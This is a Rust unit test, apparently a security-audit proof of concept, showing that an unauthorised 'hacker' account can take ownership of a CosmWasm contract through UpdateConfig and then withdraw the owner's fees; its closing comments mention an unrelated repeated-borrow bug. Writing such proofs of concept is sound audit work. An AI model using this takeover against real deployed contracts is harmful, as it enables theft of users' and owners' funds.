use super::*;
use crate::contract::{execute, instantiate, query};
use crate::msg::{ExecuteMsg, InstantiateMsg, QueryMsg};
use crate::state::Config;
use cosmwasm_std::testing::{mock_dependencies, mock_env, mock_info};
use cosmwasm_std::{coins, from_binary, Coin, Decimal, Uint128};

#[test]
fn poc() {
    let mut deps = mock_dependencies();

    // Set-up: contract is owned by `creator`
    let msg = InstantiateMsg {};
    let info = mock_info("creator", &coins(1000, DENOM.to_string()));
    instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    let res = query(deps.as_ref(), mock_env(), QueryMsg::Config {}).unwrap();
    let value: Config = from_binary(&res).unwrap();
    assert_eq!(value.owner, "creator".to_string());
    
    // alice deposits 1000 funds
    let info = mock_info("alice", &coins(1_000, DENOM));
    let msg = ExecuteMsg::Deposit {};
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // alice withdraws all her funds, creating fees for the owner
    let empty_fund: Vec<Coin> = vec![];
    let info = mock_info("alice", &empty_fund);
    let msg = ExecuteMsg::Withdraw {
        amount: Uint128::new(1000),
    };
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // Hacker changes owner 
    let info = mock_info("hacker", &[]);
    let msg = ExecuteMsg::UpdateConfig {
        new_owner: "hacker".to_string(),
    };
    execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    let res = query(deps.as_ref(), mock_env(), QueryMsg::Config {}).unwrap();
    let value: Config = from_binary(&res).unwrap();
    assert_eq!(value.owner, "hacker".to_string());
    
    // hacker withdraw fees
    let info = mock_info("hacker", &empty_fund);
    let msg = ExecuteMsg::WithdrawFees {};
    let res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
    assert_eq!(res.attributes.len(), 2);
    assert_eq!(res.attributes[0].value, "withdraw_fees");
    assert_eq!(
        res.attributes[1].value,
        (Uint128::new(1000) * Decimal::percent(5)).to_string()
    );

    // The hacker is able to repeatedly borrow 500 funds because USER_BORROW is not saved into storage
    // The contract should prevent users from borrowing again if they have not repaid their previous borrow
    // execute(deps.as_mut(), mock_env(), info.clone(), msg.clone()).unwrap();
}
